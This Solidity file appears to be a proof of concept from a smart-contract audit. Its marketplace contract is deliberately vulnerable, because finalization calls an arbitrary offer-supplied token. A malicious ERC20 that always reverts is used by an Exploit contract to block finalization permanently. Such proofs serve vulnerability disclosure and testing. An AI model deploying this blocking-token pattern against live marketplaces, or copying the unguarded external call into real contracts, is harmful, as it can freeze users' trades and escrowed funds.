// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20Arbitrary {
    function transfer(address to, uint256 amount) external returns (bool);
}

contract MaliciousERC20 is IERC20Arbitrary {
    function transfer(address, uint256) external pure returns (bool) {
        revert("malicious currency blocks transfer");
    }
}

contract OriginMarketplace {
    address public currency;
    uint256 public value;
    bool public finalized;

    function makeOffer(address _currency, uint256 _value) external {
        currency = _currency;
        value = _value;
    }

    function finalize() external {
        // @> VULN: arbitrary offer.currency is called during finalization with no escape hatch.
        require(IERC20Arbitrary(currency).transfer(msg.sender, value), "Transfer failed");
        finalized = true;
    }
}

contract Exploit {
    OriginMarketplace public marketplace;
    MaliciousERC20 public malicious;
    bool public finalizationBlocked;
    bool public confirmed;

    constructor() {
        marketplace = new OriginMarketplace();
        malicious = new MaliciousERC20();
    }

    function run() external {
        marketplace.makeOffer(address(malicious), 100);
        try this.finalize() {
            revert("malicious currency did not block finalization");
        } catch {
            finalizationBlocked = true;
        }
        require(finalizationBlocked, "offer finalized unexpectedly");
        require(!marketplace.finalized(), "finalized flag changed");
        confirmed = true;
    }

    function finalize() external {
        marketplace.finalize();
    }
}

